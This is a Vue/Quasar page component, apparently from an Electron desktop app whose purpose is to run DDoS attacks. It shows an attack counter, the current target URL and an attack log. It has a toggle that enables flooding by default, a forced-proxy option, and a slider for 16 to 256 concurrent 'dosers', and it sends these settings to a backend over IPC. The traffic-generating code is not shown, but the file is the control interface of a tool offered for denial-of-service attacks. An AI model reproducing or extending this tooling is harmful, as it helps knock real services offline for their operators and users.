<template>
  <q-page class="row items-center justify-evenly bg-grey-10 text-white">
    <q-card class="bg-grey-10 full-card">
      <q-card-section>
        <div class="text-h4 text-center">{{ $t('ddos.counter.atackedTimes') }}</div>
        <div class="text-h1 text-center">{{ atackCounter }}</div>
        <div class="text-h5 text-center">{{ $t('ddos.counter.currentTarget') + currentAtack }}</div>
      </q-card-section>
      <q-card-section>
        <div class="text-subtitle2 text-grey-7">{{ $t('ddos.description') }}</div>
      </q-card-section>
      <q-card-section>
        <LanguageSelect />
      </q-card-section>
      <q-card-section>
        <q-list>
          <q-item tag="label" v-ripple>
            <q-item-section>
              <q-item-label>{{ $t('ddos.enable.name') }}</q-item-label>
              <q-item-label caption class="text-grey-7">{{ $t('ddos.enable.description') }}</q-item-label>
            </q-item-section>
            <q-item-section avatar>
              <q-toggle color="green" v-model="ddosEnabled" val="friend" />
            </q-item-section>
          </q-item>

          <q-item tag="label" v-ripple>
            <q-item-section>
              <q-item-label>{{ $t('ddos.proxy.name') }}</q-item-label>
              <q-item-label caption class="text-grey-7">{{ $t('ddos.proxy.description') }}</q-item-label>
            </q-item-section>
            <q-item-section avatar>
              <q-toggle color="blue" v-model="forceProxy" val="picture" />
            </q-item-section>
          </q-item>
        </q-list>
      </q-card-section>
      <q-card-section>
        <q-scroll-area style="height: 200px;">
          <div v-for="n in log.length" :key="n" class="">
            {{ log[n] }}
          </div>
        </q-scroll-area>
      </q-card-section>
      <q-card-section>
        <div class="text-subtitle2 text-grey-7">{{ $t('ddos.coordinators') }}</div>
      </q-card-section>
    </q-card>

    <q-page-sticky position="bottom-right" :offset="[18, 18]">
      <q-btn fab icon="settings" color="grey-9" @click="advancedSettingsDialog = true"/>
    </q-page-sticky>

    <q-dialog v-model="advancedSettingsDialog">
      <q-card>
        <q-card-section>
          <div class="text-h6">{{ $t('ddos.advanced.header') }}</div>
          <q-item-label caption class="text-grey-7">{{ $t('ddos.advanced.description') }}</q-item-label>
        </q-card-section>

        <q-card-section class="q-pt-none">
          <div class="text-h7">{{ $t('ddos.advanced.masDosersCount.name') }}</div>
          <q-slider
            v-model="maxDosersCount"
            :min="16"
            :max="256"
            :step="16"
            label
            color="light-green"
          />
          <q-item-label caption class="text-grey-7">{{ $t('ddos.advanced.masDosersCount.description') }}</q-item-label>
        </q-card-section>

        <q-card-actions align="right">
          <q-btn flat label="OK" color="primary" class="fit" v-close-popup />
        </q-card-actions>
      </q-card>
    </q-dialog>
  </q-page>
</template>

<script lang="ts">
import { defineComponent, ref } from 'vue'
import LanguageSelect from '../components/LanguageSelect.vue'
// import { ipcRenderer, IpcRendererEvent } from 'electron'

export default defineComponent({
  name: 'PageIndex',

  components: { LanguageSelect },

  methods: {
    serveAtack (_event: unknown, data: { url: string, log: string }) {
      if ((new Date()).getTime() - this.lastAtackChange.getTime() > 1000) {
        this.currentAtack = data.url
        this.lastAtackChange = new Date()
      }
      this.atackCounter += 1
      if (this.log.length > 100) this.log.pop()
      this.log.unshift(data.log)
    }
  },

  watch: {
    ddosEnabled (newVal: boolean) {
      window.require('electron').ipcRenderer.send('updateDDOSEnable', { newVal })
    },
    forceProxy (newVal: boolean) {
      window.require('electron').ipcRenderer.send('updateForceProxy', { newVal })
    },
    maxDosersCount (newVal: boolean) {
      window.require('electron').ipcRenderer.send('updateMaxDosersCount', { newVal })
    }
  },

  mounted () {
    window.require('electron').ipcRenderer.on('atack', this.serveAtack.bind(this))
  },

  setup () {
    const ddosEnabled = ref(true)
    const forceProxy = ref(true)
    const atackCounter = ref(0)
    const currentAtack = ref('')
    const lastAtackChange = ref(new Date())
    const log = ref([] as Array<string>)

    const advancedSettingsDialog = ref(false)
    const maxDosersCount = ref(32)

    return { ddosEnabled, forceProxy, atackCounter, currentAtack, lastAtackChange, log, advancedSettingsDialog, maxDosersCount }
  }
})
</script>

<style lang="sass" scoped>
.full-card
  width: 80%
  max-width: 700px
</style>
